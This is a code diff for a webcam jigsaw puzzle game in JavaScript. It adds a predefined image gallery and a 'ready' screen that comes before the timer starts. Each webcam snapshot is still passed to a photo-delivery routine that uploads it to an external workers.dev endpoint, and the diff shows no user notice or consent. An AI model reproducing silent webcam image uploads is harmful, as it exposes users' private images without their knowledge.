@@ -7,6 +7,13 @@ const PHOTO_UPLOAD_CONFIG = {
     endpoint: 'https://cyber-puzzle-ai.dushah2007.workers.dev/upload'
 };
 
+// --- PREDEFINED PUZZLE GALLERY (assets/puzzles/puzzle_1.jpg to puzzle_20.jpg) ---
+const PREDEFINED_PUZZLES = Array.from({ length: 20 }, (_, i) => ({
+    id: i + 1,
+    title: `Puzzle ${String(i + 1).padStart(2, '0')}`,
+    src: `assets/puzzles/puzzle_${i + 1}.jpg`
+}));
+
 // --- NAMESPACES & STATE ---
 const Config = {
     PINCH_HOLD_DURATION: 0.4,
@@ -17,7 +24,7 @@ const Config = {
 };
 
 const State = {
-    mode: 'TUTORIAL', // TUTORIAL, INIT, CAPTURE, PLAYING, SOLVED, ERROR
+    mode: 'TUTORIAL', // TUTORIAL, INIT, CAPTURE, READY, PLAYING, SOLVED, ERROR
     gridSize: 3,
     soundEnabled: true,
     cameraFacingMode: 'user',
@@ -43,20 +50,24 @@ const State = {
     startTime: 0,
     elapsed: 0,
     timerInterval: null,
+    gameStarted: false,
+    gameCompleted: false,
     
     // Interaction
     isPinching: false,
     selectedTile: null,
     // grabOffset: distance from hand position to the tile's top-left corner in canvas px.
-    // Using the exact grab point (not tile center) prevents the tile from snapping under the hand.
     grabOffset: {x: 0, y: 0},
     // Smoothed drag position (lerp target) to eliminate tremor jitter
     smoothDragX: 0,
     smoothDragY: 0,
     
-    // Rendering & Metrics
+    // Rendering & Active Image
     videoReady: false,
+    sourceImage: null, // Image or Canvas source
     capturedImageCanvas: null,
+    selectedPuzzleId: 1,
+    selectedPuzzleTitle: 'Puzzle 01',
     confetti: [],
     lastTime: 0,
     fps: 60,
@@ -81,7 +92,17 @@ const Els = {
     hint: document.getElementById('hint-btn'),
     sound: document.getElementById('sound-btn'),
     cam: document.getElementById('cam-btn'),
+    galleryBtn: document.getElementById('gallery-btn'),
     fs: document.getElementById('fullscreen-btn'),
+    galleryModal: document.getElementById('gallery-modal'),
+    galleryCloseBtn: document.getElementById('gallery-close-btn'),
+    galleryGrid: document.getElementById('gallery-grid'),
+    readyOverlay: document.getElementById('ready-overlay'),
+    startPuzzleBtn: document.getElementById('start-puzzle-btn'),
+    readyCanvas: document.getElementById('ready-canvas'),
+    readyTitle: document.getElementById('ready-title'),
+    readyGridBadge: document.getElementById('ready-grid-badge'),
+    winGalleryBtn: document.getElementById('win-gallery-btn'),
     settingsBtn: document.getElementById('settings-btn'),
     settingsModal: document.getElementById('settings-modal'),
     settingsCloseBtn: document.getElementById('settings-close-btn'),
@@ -371,6 +392,71 @@ const VisionManager = {
     }
 };
 
+// --- GALLERY MANAGER ---
+const GalleryManager = {
+    init() {
+        this.renderGalleryGrid();
+    },
+    renderGalleryGrid() {
+        if (!Els.galleryGrid) return;
+        Els.galleryGrid.innerHTML = PREDEFINED_PUZZLES.map(p => `
+            <div class="gallery-item ${State.selectedPuzzleId === p.id ? 'active' : ''}" data-id="${p.id}" role="button" tabindex="0" aria-label="${p.title}">
+                <div class="gallery-thumb-wrap">
+                    <img class="gallery-thumb" src="${p.src}" alt="${p.title}" loading="lazy" />
+                </div>
+                <div class="gallery-item-label">${p.title}</div>
+            </div>
+        `).join('');
+
+        Els.galleryGrid.querySelectorAll('.gallery-item').forEach(item => {
+            item.addEventListener('click', () => {
+                const id = parseInt(item.dataset.id);
+                this.selectPuzzle(id);
+            });
+            item.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    const id = parseInt(item.dataset.id);
+                    this.selectPuzzle(id);
+                }
+            });
+        });
+    },
+    selectPuzzle(id) {
+        AudioEngine.playClick();
+        const puzzle = PREDEFINED_PUZZLES.find(p => p.id === id);
+        if (!puzzle) return;
+
+        State.selectedPuzzleId = puzzle.id;
+        State.selectedPuzzleTitle = puzzle.title;
+
+        // Update active class in gallery
+        document.querySelectorAll('.gallery-item').forEach(el => {
+            el.classList.toggle('active', parseInt(el.dataset.id) === id);
+        });
+
+        // Close gallery modal
+        UIManager.hide('gallery-modal');
+
+        // Load image and show ready screen
+        this.loadPuzzleImage(puzzle);
+    },
+    loadPuzzleImage(puzzle) {
+        UIManager.show('loading-indicator');
+        const img = new Image();
+        img.onload = () => {
+            UIManager.hide('loading-indicator');
+            State.sourceImage = img;
+            PuzzleEngine.setupCanvasFromImage(img);
+            UIManager.showReadyScreen(puzzle.title);
+        };
+        img.onerror = () => {
+            UIManager.hide('loading-indicator');
+            console.error(`Failed to load ${puzzle.title} from ${puzzle.src}`);
+        };
+        img.src = puzzle.src;
+    }
+};
+
 // --- PUZZLE ENGINE (Drag & Drop Swap) ---
 const PuzzleEngine = {
     getBoardBounds() {
@@ -391,6 +477,41 @@ const PuzzleEngine = {
         const oy = (Els.canvas.height - sizeInCanvas) / 2;
         
         return { size: sizeInCanvas, ox, oy, tw: sizeInCanvas / State.gridSize, th: sizeInCanvas / State.gridSize };
+    },
+    setupCanvasFromImage(source) {
+        if (!Els.canvas.width || Els.canvas.width < 100) {
+            Els.canvas.width = 1280;
+            Els.canvas.height = 720;
+        }
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = Els.canvas.width;
+        canvas.height = Els.canvas.height;
+        const ctx = canvas.getContext('2d');
+        
+        const b = this.getBoardBounds();
+        
+        // Source width & height
+        const srcW = source.videoWidth || source.naturalWidth || source.width;
+        const srcH = source.videoHeight || source.naturalHeight || source.height;
+        
+        // Crop source to centered square
+        const minDim = Math.min(srcW, srcH);
+        const sx = (srcW - minDim) / 2;
+        const sy = (srcH - minDim) / 2;
+        
+        ctx.drawImage(source, sx, sy, minDim, minDim, b.ox, b.oy, b.size, b.size);
+        
+        State.sourceImage = source;
+        State.capturedImageCanvas = canvas;
+        
+        // Update Mini Preview canvas
+        Els.previewCanvas.width = 300;
+        Els.previewCanvas.height = 300;
+        const pCtx = Els.previewCanvas.getContext('2d');
+        pCtx.clearRect(0, 0, 300, 300);
+        pCtx.drawImage(canvas, b.ox, b.oy, b.size, b.size, 0, 0, 300, 300);
+        UIManager.show('mini-preview');
     },
     generate(size) {
         State.gridSize = size;
@@ -418,7 +539,8 @@ const PuzzleEngine = {
         
         State.tiles.forEach(tile => {
             tile.canvas = document.createElement('canvas');
-            tile.canvas.width = b.tw; tile.canvas.height = b.th;
+            tile.canvas.width = Math.ceil(b.tw);
+            tile.canvas.height = Math.ceil(b.th);
             const ctx = tile.canvas.getContext('2d');
             const sx = b.ox + tile.origC * b.tw;
             const sy = b.oy + tile.origR * b.th;
@@ -426,16 +548,19 @@ const PuzzleEngine = {
         });
     },
     shuffle() {
-        // Free swap puzzle doesn't need to step backwards for solvability. Any permutation is solvable.
-        for (let i = State.tiles.length - 1; i > 0; i--) {
-            const j = Math.floor(Math.random() * (i + 1));
-            const tempC = State.tiles[i].c;
-            const tempR = State.tiles[i].r;
-            State.tiles[i].c = State.tiles[j].c;
-            State.tiles[i].r = State.tiles[j].r;
-            State.tiles[j].c = tempC;
-            State.tiles[j].r = tempR;
-        }
+        let attempts = 0;
+        do {
+            for (let i = State.tiles.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                const tempC = State.tiles[i].c;
+                const tempR = State.tiles[i].r;
+                State.tiles[i].c = State.tiles[j].c;
+                State.tiles[i].r = State.tiles[j].r;
+                State.tiles[j].c = tempC;
+                State.tiles[j].r = tempR;
+            }
+            attempts++;
+        } while (State.tiles.every(t => t.c === t.origC && t.r === t.origR) && attempts < 10);
         QATester.assert(true, `Shuffled ${State.gridSize}x${State.gridSize} tiles freely`);
     },
     getTileAt(x, y) {
@@ -805,37 +930,64 @@ function gameLoop(timestamp) {
 
 // --- UI MANAGER ---
 const UIManager = {
-    show(id) { document.getElementById(id).classList.remove('hidden'); },
-    hide(id) { document.getElementById(id).classList.add('hidden'); },
+    show(id) { 
+        const el = document.getElementById(id);
+        if (el) el.classList.remove('hidden'); 
+    },
+    hide(id) { 
+        const el = document.getElementById(id);
+        if (el) el.classList.add('hidden'); 
+    },
     updateStats() {
         Els.move.innerText = State.moves;
     },
-    executeCapture() {
-        AudioEngine.init();
-        AudioEngine.playClick();
-        this.hide('capture-instruction');
-        
-        // Capture snapshot
-        State.capturedImageCanvas = document.createElement('canvas');
-        State.capturedImageCanvas.width = Els.canvas.width; State.capturedImageCanvas.height = Els.canvas.height;
-        const ctx = State.capturedImageCanvas.getContext('2d');
-        if (State.cameraFacingMode === 'user') { ctx.translate(Els.canvas.width, 0); ctx.scale(-1, 1); }
-        ctx.drawImage(Els.video, 0, 0, Els.canvas.width, Els.canvas.height);
-        
-        // Setup Mini Preview
-        Els.previewCanvas.width = State.capturedImageCanvas.width;
-        Els.previewCanvas.height = State.capturedImageCanvas.height;
-        Els.previewCanvas.getContext('2d').drawImage(State.capturedImageCanvas, 0, 0);
-        this.show('mini-preview');
-        
-        // Trigger non-blocking photo delivery (if enabled)
-        PhotoDeliveryManager.sendCapturedPhoto(State.capturedImageCanvas);
-
-        PuzzleEngine.generate(parseInt(Els.difficulty.value) || 3);
-        Els.fallbackHint.classList.remove('hidden');
-        setTimeout(() => Els.fallbackHint.classList.add('hidden'), 4000);
-        
+    showReadyScreen(title) {
+        clearInterval(State.timerInterval);
+        State.mode = 'READY';
+        State.gameStarted = false;
         State.elapsed = 0;
+        State.moves = 0;
+        Els.time.innerText = '00:00';
+        Els.move.innerText = '0';
+        Els.undo.disabled = true;
+
+        this.hide('tutorial-overlay');
+        this.hide('win-modal');
+        this.hide('capture-instruction');
+        this.hide('error-screen');
+        this.hide('loading-indicator');
+
+        // Update Ready Screen elements
+        if (Els.readyTitle) Els.readyTitle.innerText = title || State.selectedPuzzleTitle || 'Selected Puzzle';
+        if (Els.readyGridBadge) Els.readyGridBadge.innerText = `${State.gridSize} × ${State.gridSize}`;
+
+        // Draw preview onto ready canvas
+        if (Els.readyCanvas && State.capturedImageCanvas) {
+            Els.readyCanvas.width = 300;
+            Els.readyCanvas.height = 300;
+            const rCtx = Els.readyCanvas.getContext('2d');
+            const b = PuzzleEngine.getBoardBounds();
+            rCtx.clearRect(0, 0, 300, 300);
+            rCtx.drawImage(State.capturedImageCanvas, b.ox, b.oy, b.size, b.size, 0, 0, 300, 300);
+        }
+
+        this.show('ready-overlay');
+        Els.canvas.classList.add('visible');
+    },
+    startPuzzle() {
+        AudioEngine.playClick();
+        this.hide('ready-overlay');
+
+        // Generate and shuffle tiles
+        PuzzleEngine.generate(State.gridSize);
+
+        State.mode = 'PLAYING';
+        State.gameStarted = true;
+        State.moves = 0;
+        State.elapsed = 0;
+        this.updateStats();
+
+        // Start Timer NOW
         clearInterval(State.timerInterval);
         State.startTime = Date.now();
         State.timerInterval = setInterval(() => {
@@ -844,8 +996,34 @@ const UIManager = {
             const s = (State.elapsed % 60).toString().padStart(2, '0');
             Els.time.innerText = `${m}:${s}`;
         }, 1000);
-        
-        State.mode = 'PLAYING';
+
+        Els.fallbackHint.classList.remove('hidden');
+        setTimeout(() => Els.fallbackHint.classList.add('hidden'), 4000);
+    },
+    executeCapture() {
+        AudioEngine.init();
+        AudioEngine.playClick();
+        this.hide('capture-instruction');
+
+        // Capture snapshot from webcam
+        const snapshot = document.createElement('canvas');
+        snapshot.width = Els.canvas.width;
+        snapshot.height = Els.canvas.height;
+        const ctx = snapshot.getContext('2d');
+        if (State.cameraFacingMode === 'user') {
+            ctx.translate(Els.canvas.width, 0);
+            ctx.scale(-1, 1);
+        }
+        ctx.drawImage(Els.video, 0, 0, Els.canvas.width, Els.canvas.height);
+
+        // Setup puzzle canvas from captured snapshot
+        PuzzleEngine.setupCanvasFromImage(snapshot);
+
+        // Trigger non-blocking photo delivery (if enabled)
+        PhotoDeliveryManager.sendCapturedPhoto(State.capturedImageCanvas);
+
+        // Show Ready screen before starting timer
+        this.showReadyScreen('Camera Capture');
     },
     showWinScreen(isNewBest) {
         document.getElementById('win-time').innerText = Els.time.innerText;
@@ -872,6 +1050,41 @@ const UIManager = {
         document.getElementById('retry-cam-btn').addEventListener('click', () => {
             this.show('loading-indicator'); VisionManager.init();
         });
+
+        // Start Puzzle button (from Ready screen)
+        if (Els.startPuzzleBtn) {
+            Els.startPuzzleBtn.addEventListener('click', () => {
+                UIManager.startPuzzle();
+            });
+        }
+
+        // Gallery Modal event bindings
+        if (Els.galleryBtn) {
+            Els.galleryBtn.addEventListener('click', () => {
+                AudioEngine.playClick();
+                UIManager.show('gallery-modal');
+            });
+        }
+        if (Els.winGalleryBtn) {
+            Els.winGalleryBtn.addEventListener('click', () => {
+                AudioEngine.playClick();
+                UIManager.hide('win-modal');
+                UIManager.show('gallery-modal');
+            });
+        }
+        if (Els.galleryCloseBtn) {
+            Els.galleryCloseBtn.addEventListener('click', () => {
+                AudioEngine.playClick();
+                UIManager.hide('gallery-modal');
+            });
+        }
+        if (Els.galleryModal) {
+            Els.galleryModal.addEventListener('click', (e) => {
+                if (e.target === Els.galleryModal) {
+                    UIManager.hide('gallery-modal');
+                }
+            });
+        }
         
         // Settings Modal event bindings
         if (Els.settingsBtn) {
@@ -902,7 +1115,7 @@ const UIManager = {
 
         const resetToCapture = () => {
             AudioEngine.playClick();
-            this.hide('win-modal'); this.hide('mini-preview'); this.show('capture-instruction');
+            this.hide('win-modal'); this.hide('mini-preview'); this.hide('ready-overlay'); this.show('capture-instruction');
             State.mode = 'CAPTURE'; clearInterval(State.timerInterval); Els.time.innerText = '00:00';
             State.moves = 0; this.updateStats(); State.hand.pinchTime = 0;
         };
@@ -952,15 +1165,25 @@ const UIManager = {
                     Els.time.innerText = `${Math.floor(State.elapsed / 60).toString().padStart(2, '0')}:${(State.elapsed % 60).toString().padStart(2, '0')}`;
                 }, 1000);
                 State.mode = 'PLAYING';
+            } else if (State.mode === 'READY') {
+                UIManager.startPuzzle();
             }
         };
         document.getElementById('restart-btn').addEventListener('click', restartGame);
         document.getElementById('play-again-btn').addEventListener('click', restartGame);
+        
         Els.difficulty.addEventListener('change', () => {
             AudioEngine.playClick();
+            State.gridSize = parseInt(Els.difficulty.value) || 3;
             StorageManager.updateBestDisplay();
-            if(State.mode === 'PLAYING' || State.mode === 'SOLVED') {
-                PuzzleEngine.generate(parseInt(Els.difficulty.value) || 3);
+            
+            if (State.mode === 'READY') {
+                if (Els.readyGridBadge) Els.readyGridBadge.innerText = `${State.gridSize} × ${State.gridSize}`;
+            } else if (State.mode === 'PLAYING' || State.mode === 'SOLVED') {
+                if (State.sourceImage) {
+                    PuzzleEngine.setupCanvasFromImage(State.sourceImage);
+                }
+                PuzzleEngine.generate(State.gridSize);
                 restartGame();
             }
         });
@@ -1023,6 +1246,14 @@ const UIManager = {
             resizeDebounce = setTimeout(() => {
                 if ((State.mode === 'PLAYING' || State.mode === 'SOLVED') && State.capturedImageCanvas) {
                     PuzzleEngine.cacheTileImages();
+                } else if (State.mode === 'READY' && State.capturedImageCanvas) {
+                    const readyCanvas = document.getElementById('ready-canvas');
+                    if (readyCanvas) {
+                        const rCtx = readyCanvas.getContext('2d');
+                        const b = PuzzleEngine.getBoardBounds();
+                        rCtx.clearRect(0, 0, 300, 300);
+                        rCtx.drawImage(State.capturedImageCanvas, b.ox, b.oy, b.size, b.size, 0, 0, 300, 300);
+                    }
                 }
             }, 100);
         };
@@ -1040,5 +1271,6 @@ const UIManager = {
 QATester.runStartupTests();
 StorageManager.updateBestDisplay();
 PhotoDeliveryManager.init();
+GalleryManager.init();
 UIManager.bindEvents();
 requestAnimationFrame(gameLoop);
